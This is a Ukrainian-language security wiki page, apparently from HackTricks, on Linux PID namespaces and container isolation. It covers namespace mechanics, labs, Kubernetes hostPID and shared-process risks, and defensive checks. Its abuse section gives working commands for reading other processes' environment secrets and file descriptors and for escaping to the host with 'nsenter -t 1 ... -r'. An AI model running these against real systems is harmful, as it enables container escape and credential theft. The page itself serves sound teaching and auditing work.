# Простір імен PID

{{#include ../../../../../banners/hacktricks-training.md}}

## Огляд

Простір імен PID визначає, як нумеруються процеси та які процеси видно. Саме тому контейнер може мати власний PID 1, хоча він не є реальною машиною. Усередині простору імен робоче навантаження бачить те, що виглядає як локальне дерево процесів. Ззовні простору імен хост і далі бачить справжні PID хоста та повну картину процесів.<sup>[[3]](#references)</sup>

З погляду безпеки простір імен PID важливий через цінність видимості процесів. Якщо робоче навантаження бачить процеси хоста, воно може спостерігати за назвами служб, аргументами командного рядка, секретами, переданими в аргументах процесу, станом, отриманим зі змінних середовища через `/proc`, і потенційними цілями для входу в простір імен. Якщо воно може не лише бачити ці процеси, а й, наприклад, надсилати їм сигнали або використовувати ptrace за належних умов, проблема стає набагато серйознішою.

## Робота

Новий простір імен PID починає власну внутрішню нумерацію процесів. Перший створений у ньому процес стає PID 1 з погляду цього простору імен, а отже, отримує особливу поведінку, подібну до init, для осиротілих дочірніх процесів і сигналів. Це пояснює чимало дивних особливостей контейнерів, пов’язаних із процесами init, збиранням zombie-процесів і тим, чому в контейнерах іноді використовують мінімалістичні обгортки init.<sup>[[3]](#references)</sup>

Простори імен PID утворюють ієрархію. Процес у батьківському просторі імен може звертатися до нащадків за PID, призначеним у цьому батьківському просторі, але нащадок не може звертатися до завдань, видимих лише в батьківському просторі, через звичайні системні виклики на основі PID або піднятися до батьківського простору імен PID за допомогою `setns()`. Водночас procfs, що належить батьківському простору імен і навмисно наданий нащадку, усе ще може leak уявлення про процеси батьківського простору. Також приєднання до простору імен PID через `setns()` змінює простір імен для **майбутніх дочірніх процесів**, а не для самого викликувача; тому інструменти створюють дочірній процес після приєднання. Монтування procfs зберігає уявлення про PID того процесу, який його змонтував. Саме тому створення нового procfs після `unshare(CLONE_NEWPID)` важливе для безпеки, а не є лише косметичною дією.<sup>[[3]](#references)</sup>

Головний урок щодо безпеки полягає в тому, що процес може здаватися ізольованим, оскільки бачить лише власне дерево PID, але цю ізоляцію можна навмисно прибрати. У Docker це робиться за допомогою `--pid=host`, а в Kubernetes — за допомогою `hostPID: true`. Після приєднання контейнера до простору імен PID хоста робоче навантаження безпосередньо бачить процеси хоста, а багато подальших шляхів атаки стають значно реалістичнішими.

## Лабораторна робота

Щоб створити простір імен PID вручну:

```bash
sudo unshare --pid --fork --mount-proc bash
ps -ef
echo $$
```

Тепер shell бачить приватне представлення процесів. Прапорець `--mount-proc` важливий, оскільки він монтує екземпляр procfs, що відповідає новому PID namespace, завдяки чому список процесів усередині є узгодженим.<sup>[[3]](#references)</sup>

Щоб порівняти поведінку контейнера:

```bash
docker run --rm debian:stable-slim ps -ef
docker run --rm --pid=host debian:stable-slim ps -ef | head
```

Різниця очевидна й зрозуміла, тому це хороша перша лабораторна робота для читачів.

## Використання під час виконання

Звичайні контейнери в Docker, Podman, containerd і CRI-O отримують власний простір імен PID. Контейнери Kubernetes зазвичай мають окремі подання PID; параметр `shareProcessNamespace: true` навмисно створює спільне для всього Pod подання.<sup>[[4]](#references)</sup> Натомість `hostPID: true` вибирає простір імен PID вузла. Середовища LXC/Incus покладаються на той самий примітив ядра, хоча сценарії використання системних контейнерів можуть відкривати складніші дерева процесів і спонукати до використання додаткових способів налагодження.

Скрізь діє одне й те саме правило: якщо середовище виконання вирішило не ізолювати простір імен PID, це свідоме послаблення межі контейнера.

## Неправильні конфігурації

Класична неправильна конфігурація — спільний простір імен PID вузла. Команди часто виправдовують це зручністю налагодження, моніторингу чи керування службами, але до цього завжди слід ставитися як до суттєвого винятку з погляду безпеки. Навіть якщо контейнер не має безпосереднього способу запису до процесів вузла, сама лише видимість може багато розкрити про систему. Якщо додати такі capabilities, як `CAP_SYS_PTRACE`, або корисний доступ до procfs, ризик значно зростає.

Ще одна помилка — вважати спільний простір імен PID вузла нешкідливим лише тому, що робоче навантаження за замовчуванням не може завершувати процеси вузла чи використовувати ptrace для доступу до них. Такий висновок ігнорує цінність переліку процесів, наявність цілей для входу в простори імен і те, як видимість PID поєднується з іншими послабленими засобами контролю.

### Спільний доступ до процесів у межах Pod Kubernetes

`shareProcessNamespace: true` відрізняється від `hostPID`: він відкриває процеси **інших контейнерів у тому самому Pod**, а не процеси вузла. Тоді скомпрометований sidecar або контейнер для налагодження може перелічувати командні рядки й дані середовища контейнерів-сусідів з урахуванням перевірок доступу procfs, надсилати сигнали, якщо це дозволяють облікові дані, і переглядати файлову систему контейнера-сусіда через `/proc/<pid>/root`. Kubernetes прямо попереджає, що в такому разі командні рядки, секрети середовища та файлові системи контейнерів захищені лише відповідними дозволами Unix.<sup>[[4]](#references)</sup>

Корисна перевірка на рівні кластера:

```bash
kubectl get pods -A -o json | jq -r '
  .items[] |
  select(.spec.hostPID == true or .spec.shareProcessNamespace == true) |
  [.metadata.namespace,.metadata.name,
   (.spec.hostPID // false),(.spec.shareProcessNamespace // false)] | @tsv'
```

Із скомпрометованого контейнера в PID namespace на рівні всього Pod спершу перевірте фактичний доступ, а не припускайте, що видимість означає можливість читання:<sup>[[4]](#references)</sup>

```bash
victim=$(ps -eo pid,args | awk '/[n]ginx|[j]ava|[p]ython/{print $1; exit}')
[ -n "$victim" ] || { echo "No candidate process found"; exit 1; }
tr '\0' ' ' < "/proc/$victim/cmdline" 2>/dev/null; echo
tr '\0' '\n' < "/proc/$victim/environ" 2>/dev/null | sed -n '1,20p'
find "/proc/$victim/root/run/secrets" -maxdepth 2 -type f -ls 2>/dev/null
```

### Націлені ephemeral-контейнери в наявному Kubernetes Pod

Ідентичність Kubernetes, якій дозволено змінювати `pods/ephemeralcontainers`, може додати налагоджувач до запущеного Pod, навіть якщо `shareProcessNamespace` не задано. За допомогою `--target` налагоджувач приєднується до простору імен процесів указаного контейнера, якщо середовище виконання підтримує націлювання на простір імен. Це надає змогу бачити процеси цього контейнера, а не простір імен PID вузла.<sup>[[5]](#references)</sup>

API використовує окремий субресурс, тому перевірте права `patch`/`update`, а не припускайте, що звичайні дозволи на запис у Pod їх охоплюють.<sup>[[6]](#references)</sup>

Для Pod і контейнера в авторизованому просторі імен перевірте націлений вигляд:<sup>[[5]](#references)[[6]](#references)</sup>

```bash
ns=default; pod=myapp; container=app
kubectl auth can-i get pods -n "$ns"
kubectl auth can-i patch pods/ephemeralcontainers -n "$ns"
kubectl auth can-i update pods/ephemeralcontainers -n "$ns"
kubectl auth can-i create pods/attach -n "$ns"
kubectl -n "$ns" debug -it "pod/$pod" --image=busybox:1.36 --target="$container" -- sh
# In the debug shell: verify the target processes are actually visible.
ps -ef
```

Якщо runtime не реалізує targeting, debugger може не запуститися або залишитися в ізольованому PID namespace.<sup>[[5]](#references)</sup> Якщо targeting працює, скористайтеся перевірками в розділі [Спільний доступ до процесів у межах Pod Kubernetes](#kubernetes-pod-wide-process-sharing), щоб перевірити доступ до `/proc/<pid>`. Видимість не означає дозволу читати секрети цільового процесу чи надсилати йому сигнали: перевірки облікових даних Unix і доступу до procfs все одно застосовуються.<sup>[[4]](#references)[[8]](#references)</sup> Pod Security Standards також обмежують привілейовані налаштування в ephemeral containers.<sup>[[7]](#references)</sup>

## Зловживання

Якщо спільно використовується host PID namespace, зловмисник може переглядати процеси хоста, збирати аргументи процесів, виявляти цікаві служби, знаходити потенційні PID для `nsenter` або поєднувати видимість процесів із привілеями, пов’язаними з ptrace, щоб втручатися в роботу хоста чи сусідніх workloads. У деяких випадках достатньо просто побачити потрібний довготривалий процес, щоб змінити подальший план атаки.

Перший практичний крок — завжди переконатися, що процеси хоста справді видимі:

```bash
readlink /proc/self/ns/pid
ps -ef | head -n 50
ls /proc | grep '^[0-9]' | head -n 20
```

Коли PID хоста стають видимими, аргументи процесів і цілі для входу в namespace часто стають найкориснішим джерелом інформації:

```bash
for p in 1 $(pgrep -n systemd 2>/dev/null) $(pgrep -n dockerd 2>/dev/null); do
  echo "PID=$p"
  tr '\0' ' ' < /proc/$p/cmdline 2>/dev/null; echo
done
```

Якщо доступний `nsenter` і є достатньо привілеїв, перевірте, чи можна використати видимий процес хоста як міст між namespace:

```bash
which nsenter
nsenter -t 1 -m -u -n -i -p sh 2>/dev/null || echo "nsenter blocked"
```

Навіть коли вхід заблоковано, спільний із хостом PID-простір уже корисний, оскільки він розкриває структуру сервісів, компоненти середовища виконання та потенційні привілейовані процеси, які можна атакувати далі. Сама лише видимість PID **не** надає дозволу надсилати сигнали, трасувати процеси, читати чутливі записи `/proc/<pid>` або приєднуватися до інших namespace цільового процесу; також мають значення облікові дані, dumpability, capabilities у user namespace, якому належить namespace цільового процесу, політики Yama/LSM і seccomp.<sup>[[3]](#references)</sup> Див. [CAP_SYS_PTRACE](../../../../interesting-files-permissions/linux-capabilities.md#cap_sys_ptrace), щоб ознайомитися з прикладами впровадження коду в процеси.

Видимість PID хоста також робить зловживання дескрипторами файлів реалістичнішим. Якщо привілейований процес хоста або сусіднє навантаження має відкритий чутливий файл чи сокет, зловмисник може переглянути `/proc/<pid>/fd/` і отримати доступ до базового об’єкта — залежно від перевірок на кшталт ptrace, власника, параметрів монтування procfs, типу об’єкта та моделі цільового сервісу. Сам факт видимості символьного посилання на FD не означає, що його можна відкрити, а сокет не можна дублювати, просто відкривши його символьне посилання `/proc/<pid>/fd/N`. Інформацію про окремий примітив `pidfd_getfd()` і перевірки авторизації для нього див. у [Linux ptrace exit-race pidfd FD theft](../../../../main-system-information/kernel-lpe-cves/linux-ptrace-exit-race-pidfd_getfd-fd-theft.md).<sup>[[3]](#references)</sup>

```bash
for fd_dir in /proc/[0-9]*/fd; do
  ls -l "$fd_dir" 2>/dev/null | sed "s|^|$fd_dir -> |"
done
grep " /proc " /proc/mounts
```

Ці команди корисні, оскільки дають змогу з’ясувати, чи `hidepid=1` або `hidepid=2` обмежує видимість між процесами та чи взагалі видно очевидно цікаві дескриптори, як-от відкриті файли із секретами, журнали або Unix-сокети.

### Повний приклад: host PID + `nsenter`

Спільний простір імен host PID може сприяти виходу з контейнера на host, якщо процес має необхідні capabilities, щоб приєднатися до просторів імен host і використовувати root-каталог процесу host. Для останнього потрібен `nsenter --root` (`-r`): сама лише зміна простору імен монтування не змінює кореневий каталог процесу, що виконує команду.<sup>[[9]](#references)</sup> Доступ до `/proc/1/root` перевіряється за правилами читання ptrace, а для зміни кореневого каталогу потрібен `CAP_SYS_CHROOT` у просторі імен користувача процесу, що виконує команду.<sup>[[8]](#references)[[10]](#references)</sup>

```bash
ps -ef | head -n 50
capsh --print | grep -E 'cap_sys_admin|cap_sys_chroot'
nsenter -t 1 -m -u -n -i -p -r -W / -- /bin/sh
```

Якщо команда виконується успішно, нова оболонка використовує простори імен монтування, UTS, мережі, IPC і PID хоста, а також кореневу файлову систему PID 1. Перевірте ефективну ідентичність і доступ, а не вважайте, що сама лише видимість PID надала привілеї хоста.<sup>[[9]](#references)</sup>

Навіть якщо `nsenter` відсутній, такого самого результату можна досягти за допомогою бінарного файла хоста, якщо файлова система хоста змонтована:

```bash
/host/usr/bin/nsenter -t 1 -m -u -n -i -p -r -W / -- /bin/sh 2>/dev/null
```

### Нещодавні примітки щодо runtime

Деякі атаки, пов’язані з PID namespace, не є традиційними помилками конфігурації `hostPID: true`, а виникають через помилки реалізації runtime у застосуванні захисту procfs під час налаштування контейнера.

#### Race у `maskedPaths` до host procfs

В уразливих версіях `runc` зловмисники, які могли контролювати образ контейнера або робоче навантаження `runc exec`, могли влаштувати race під час етапу маскування, замінивши `/dev/null` на боці контейнера символічним посиланням на чутливий шлях procfs, як-от `/proc/sys/kernel/core_pattern`. Якщо race вдавалося, bind mount для masked-path міг бути застосований не до тієї цілі, відкриваючи новому контейнеру доступ до глобальних для хоста параметрів procfs.<sup>[[1]](#references)</sup>

Корисна команда для перевірки:

```bash
jq '.linux.maskedPaths' config.json 2>/dev/null
```

Це важливо, оскільки наслідки зрештою можуть бути такими самими, як і за прямого доступу до procfs: можливість запису в `core_pattern` або `sysrq-trigger`, що може призвести до виконання коду на хості або відмови в обслуговуванні. На сторінках про [masked paths](../masked-paths.md) і [sensitive host mounts](../../sensitive-host-mounts.md) описано загальну поверхню атак procfs без дублювання цієї інформації тут.

#### Ін’єкція в namespace за допомогою `insject`

Інструменти для ін’єкції в namespace, такі як `insject`, показують, що взаємодія з PID namespace не завжди потребує входу в цільовий namespace до створення процесу. Допоміжна програма може приєднатися пізніше, використати `setns()` і виконати команду, зберігаючи видимість цільового простору PID:<sup>[[2]](#references)</sup>

```bash
sudo insject -S -p $(pidof containerd-shim) -- bash -lc 'readlink /proc/self/ns/pid && ps -ef'
```

Цей тип техніки важливий переважно для розширеного налагодження, offensive tooling і post-exploitation сценаріїв, де контекст namespace потрібно під’єднати вже після ініціалізації workload середовищем runtime.

### Пов’язані шаблони зловживання FD

Коли видимі host PID-и, варто окремо звернути увагу на два шаблони. По-перше, привілейований процес може зберегти відкритий дескриптор конфіденційного файлу після `execve()`, якщо для нього не було встановлено `O_CLOEXEC`. По-друге, служби можуть передавати дескриптори файлів через Unix-сокети за допомогою `SCM_RIGHTS`. В обох випадках важливим об’єктом є вже не шлях, а відкритий дескриптор, який процес із нижчим рівнем привілеїв може успадкувати або отримати.

Це важливо під час роботи з контейнерами, оскільки дескриптор може вказувати на `docker.sock`, привілейований журнал, секретний файл хоста чи інший цінний об’єкт, навіть якщо сам шлях недоступний безпосередньо з файлової системи контейнера.

## Перевірки

Мета цих команд — визначити, чи має процес приватне представлення PID, чи він уже може переглядати значно ширший перелік процесів.

```bash
readlink /proc/self/ns/{pid,pid_for_children,user,mnt}
grep -E '^(Name|Pid|PPid|NSpid|Uid|Gid|TracerPid):' /proc/self/status
ps -ef | head
findmnt -no TARGET,FSTYPE,OPTIONS /proc
cat /proc/sys/kernel/yama/ptrace_scope 2>/dev/null
capsh --print 2>/dev/null | grep -E 'Current:|Bounding'
```

Що тут цікаво:<sup>[[3]](#references)</sup>

- Якщо у списку процесів є очевидні служби хоста, спільний простір PID хоста, імовірно, уже використовується.
- Невелике дерево процесів, локальне для контейнера, — це звичайний базовий стан; `systemd`, `dockerd` чи сторонні демони — ні.
- `NSpid` може показати зіставлення PID у вкладених просторах імен. Крайніше ліве значення відповідає простору імен PID, пов’язаному з монтуванням procfs, а за ним ідуть значення для послідовно вкладених просторів імен.
- Сам по собі `readlink /proc/self/ns/pid` не може довести наявність `hostPID`: ізольований контейнер також має дійсний inode простору імен PID. Зіставте його зі списком процесів, монтуванням procfs, конфігурацією середовища виконання та inode простору імен на хості, якщо він доступний.
- Коли PID хоста стають видимими, навіть інформація про процеси, доступна лише для читання, стає корисною для розвідки.

Якщо ви виявили контейнер зі спільним простором PID хоста, не вважайте це косметичною відмінністю. Це суттєво змінює те, що робоче навантаження може спостерігати й потенційно змінювати.
